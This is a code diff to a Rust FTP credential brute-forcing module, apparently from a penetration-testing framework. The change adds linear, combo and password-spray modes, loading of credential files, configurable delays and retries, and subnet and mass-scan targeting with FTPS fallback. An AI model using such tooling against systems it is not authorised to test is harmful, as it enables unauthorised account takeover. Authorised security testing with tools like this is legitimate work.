@@ -9,12 +9,13 @@ use std::{
 use tokio::time::{sleep, timeout};
 
 use crate::utils::{
-    cfg_prompt_port, cfg_prompt_existing_file, cfg_prompt_int_range,
+    cfg_prompt_default, cfg_prompt_port, cfg_prompt_existing_file, cfg_prompt_int_range,
     cfg_prompt_yes_no, cfg_prompt_output_file, load_lines,
 };
 use crate::modules::creds::utils::{
     BruteforceConfig, LoginResult, SubnetScanConfig,
-    generate_combos, run_bruteforce, run_subnet_bruteforce,
+    generate_combos_mode, parse_combo_mode, load_credential_file,
+    run_bruteforce, run_subnet_bruteforce,
     is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
 };
 
@@ -180,6 +181,7 @@ pub async fn run(target: &str) -> Result<()> {
             verbose,
             output_file,
             service_name: "ftp",
+            jitter_ms: 0,
             source_module: "creds/generic/ftp_bruteforce",
             skip_tcp_check: false,
         }, move |ip: IpAddr, port: u16, user: String, pass: String| {
@@ -212,7 +214,7 @@ pub async fn run(target: &str) -> Result<()> {
         None
     };
     let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
-    let combo_mode = cfg_prompt_yes_no("combo_mode", "Combination mode (user × pass)?", false).await?;
+    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;
 
     let users = load_lines(&usernames_file)?;
     if users.is_empty() {
@@ -228,7 +230,11 @@ pub async fn run(target: &str) -> Result<()> {
     }
     crate::mprintln!("{}", format!("[*] Loaded {} passwords", passes.len()).cyan());
 
-    let combos = generate_combos(&users, &passes, combo_mode);
+    let mut combos = generate_combos_mode(&users, &passes, parse_combo_mode(&combo_input));
+    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
+        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
+        combos.extend(load_credential_file(&cred_path)?);
+    }
 
     // Capture verbose in the closure for try_ftp_login
     let target_owned = target.to_string();
@@ -247,15 +253,19 @@ pub async fn run(target: &str) -> Result<()> {
         }
     };
 
+    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay between attempts (ms)", 0, 0, 10000).await? as u64;
+    let max_retries = cfg_prompt_int_range("max_retries", "Max retries on error", 3, 0, 10).await? as usize;
+
     let result = run_bruteforce(&BruteforceConfig {
         target: target_owned,
         port,
         concurrency,
         stop_on_success,
         verbose,
-        delay_ms: 0,
-        max_retries: 3,
+        delay_ms: delay_ms,
+        max_retries: max_retries,
         service_name: "ftp",
+        jitter_ms: 0,
         source_module: "creds/generic/ftp_bruteforce",
     }, combos, try_login).await?;
 
@@ -268,7 +278,7 @@ pub async fn run(target: &str) -> Result<()> {
 }
 
 /// Try FTP login with FTPS fallback when TLS is required.
-async fn try_ftp_login(addr: &str, target: &str, user: &str, pass: &str, _verbose: bool) -> Result<bool> {
+async fn try_ftp_login(addr: &str, target: &str, user: &str, pass: &str, verbose: bool) -> Result<bool> {
     // Attempt plain FTP
     match timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS), AsyncFtpStream::connect(addr)).await {
         Ok(Ok(mut ftp)) => {
@@ -284,7 +294,7 @@ async fn try_ftp_login(addr: &str, target: &str, user: &str, pass: &str, _verbos
                         FtpErrorType::TlsRequired => { if let Err(e) = ftp.quit().await { crate::meprintln!("[!] FTP quit error: {}", e); } }
                         FtpErrorType::ConnectionLimitExceeded => {
                             sleep(Duration::from_secs(1)).await;
-                            return Ok(false);
+                            return Err(anyhow!("Connection limit exceeded (421)"));
                         }
                         _ => return Err(anyhow!("FTP login error: {}", msg)),
                     }
@@ -296,6 +306,9 @@ async fn try_ftp_login(addr: &str, target: &str, user: &str, pass: &str, _verbos
     }
 
     // FTPS fallback
+    if verbose {
+        crate::mprintln!("  [v] {} — trying FTPS (TLS)...", addr);
+    }
     let mut ftp_tls = match timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS), AsyncNativeTlsFtpStream::connect(addr)).await {
         Ok(Ok(s)) => s,
         _ => return Err(anyhow!("FTPS Connect failed")),
